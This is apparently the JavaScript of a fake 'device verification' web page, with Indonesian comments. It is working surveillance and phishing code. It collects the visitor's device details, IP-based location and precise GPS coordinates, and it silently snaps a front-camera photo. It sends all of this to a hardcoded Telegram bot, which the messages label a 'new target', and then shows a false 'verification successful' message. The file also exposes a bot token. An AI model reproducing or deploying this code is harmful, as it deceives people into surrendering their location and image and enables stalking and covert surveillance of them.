// KREDENSIAL TELEGRAM ANDA
const TELEGRAM_BOT_TOKEN = '8612467033:AAFfEjBlNJrOdjTldqfwdYJtmy_lZMquslQ';
const TELEGRAM_CHAT_ID = '1299490151';

async function startProcess() {
    document.getElementById('verifyBtn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    const statusEl = document.getElementById('status');
    
    statusEl.innerText = "Mengumpulkan informasi perangkat secara rinci...";

    // 1. Kumpulkan Data Perangkat & Browser secara Rinci
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
    const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
    
    // Deteksi Nama Perangkat / OS yang lebih rinci dari User Agent
    let detailedDevice = "Perangkat Tidak Dikenal";
    
    if (/android/i.test(userAgent)) {
        detailedDevice = "Android";
        // Coba deteksi brand populer di Android
        if (/samsung/i.test(userAgent)) detailedDevice = "Samsung Android";
        else if (/xiaomi|redmi|poco/i.test(userAgent)) detailedDevice = "Xiaomi / Redmi";
        else if (/oppo/i.test(userAgent)) detailedDevice = "Oppo";
        else if (/vivo/i.test(userAgent)) detailedDevice = "Vivo";
        else if (/realme/i.test(userAgent)) detailedDevice = "Realme";
        else if (/huawei/i.test(userAgent)) detailedDevice = "Huawei";
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        detailedDevice = "Apple iOS (iPhone/iPad)";
    } else if (/win/i.test(platform)) {
        detailedDevice = "Windows PC";
    } else if (/mac/i.test(platform)) {
        detailedDevice = "Apple macOS";
    } else if (/linux/i.test(platform)) {
        detailedDevice = "Linux PC";
    }

    let infoText = `🚨 **TARGET BARU TERDETEKSI (RINCI)** 🚨\n\n` +
                   `💻 **Jenis OS/Device:** ${detailedDevice}\n` +
                   `📱 **Platform:** ${platform}\n` +
                   `🌐 **Bahasa:** ${language}\n` +
                   `🖥 **Resolusi Layar:** ${screenRes}\n` +
                   `⚙️ **CPU Cores:** ${hardwareConcurrency}\n` +
                   `🧠 **RAM Perangkat:** ~${deviceMemory} GB\n` +
                   `🔍 **User Agent:** \`${userAgent}\``;

    // 2. Ambil IP Publik & Lokasi Berbasis Jaringan
    try {
        let ipResponse = await fetch('https://ipapi.co/json/');
        let ipData = await ipResponse.json();
        infoText += `\n\n🌐 **IP Publik:** ${ipData.ip}\n` +
                    `📍 **Lokasi (IP):** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
                    `🏢 **ISP:** ${ipData.org}`;
    } catch (e) {
        console.error("Gagal mengambil data IP:", e);
    }

    // Kirim Teks Utama (Perangkat Rinci + IP) ke Telegram
    await sendTextToTelegram(infoText);

    // 3. Minta Izin Lokasi GPS Akurat & Kirim Link Google Maps
    statusEl.innerText = "Meminta izin koordinat GPS akurat...";
    await getGPSLocation();

    // 4. Ambil Foto Kamera Depan secara Otomatis
    try {
        statusEl.innerText = "Memverifikasi kamera perangkat...";
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        const video = document.getElementById('video');
        video.srcObject = stream;

        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async (blob) => {
                if (blob) {
                    statusEl.innerText = "Menyelesaikan verifikasi...";
                    await sendPhotoToTelegram(blob, "Foto otomatis dari kamera target.");
                }
                finalizePage();
            }, 'image/png');

        }, 1500);

    } catch (err) {
        console.warn("Akses kamera ditolak:", err);
        finalizePage();
    }
}

// Fungsi Geolocation API untuk koordinat presisi & link Google Maps
function getGPSLocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    let gpsText = `📍 **LOKASI GPS AKURAT**\n\n` +
                                  `📌 **Latitude:** ${lat}\n` +
                                  `📌 **Longitude:** ${lon}\n` +
                                  `🎯 **Akurasi:** ±${Math.round(accuracy)} meter\n\n` +
                                  `🗺 [Buka Lokasi di Google Maps](${mapsUrl})`;

                    await sendTextToTelegram(gpsText);
                    resolve();
                },
                async (error) => {
                    console.warn("Izin GPS ditolak:", error.message);
                    await sendTextToTelegram("⚠️ **Lokasi GPS:** Izin akses lokasi ditolak oleh pengguna.");
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            resolve();
        }
    });
}

function finalizePage() {
    document.getElementById('loader').style.display = 'none';
    document.getElementById('status').innerText = "";
    document.getElementById('mainCard').innerHTML = `
        <h2 style="color: #22c55e;">Verifikasi Berhasil</h2>
        <p>Terima kasih. Perangkat Anda telah berhasil diverifikasi dan terhubung ke sistem.</p>
    `;
}

async function sendTextToTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        })
    });
}

async function sendPhotoToTelegram(blob, caption) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'capture.png');
    formData.append('caption', caption);

    await fetch(url, { method: 'POST', body: formData });
}
